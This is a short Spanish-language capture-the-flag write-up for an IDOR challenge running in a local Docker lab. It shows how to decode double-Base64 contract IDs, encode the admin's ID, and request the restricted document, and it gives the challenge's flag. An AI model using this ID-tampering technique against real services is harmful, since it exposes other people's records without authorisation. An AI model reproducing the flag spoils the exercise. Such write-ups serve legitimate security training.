# IntraCorp CTF - IDOR

## Detalles

- IntraCorp CTF Challenge 02 - IDOR (Insecure Direct Object Reference)
- http://localhost:8002/

## Vulnerabilidad

- IDOR con identificadores codificados en Base64 (doble encoding)
- Sin validación de autorización en el servidor

## Inicio

```bash
docker-compose up -d challenge2
open http://localhost:8002/
```

## Writeup

### Decodificar UID

```bash
# El UID del contrato 1: TVE9PQ==
echo "TVE9PQ==" | base64 -d  # MQ==
echo "MQ==" | base64 -d      # 1
```

### Codificar ID del admin (3)

```bash
echo -n "3" | base64          # Mw==
echo -n "Mw==" | base64       # TXc9PQ==
```

### Acceder al documento restringido

```
GET /contracts/view?uid=TXc9PQ==
```

## Flag

```
HACKCON{1D0R_3NC0D3D_4CC3SS}
```
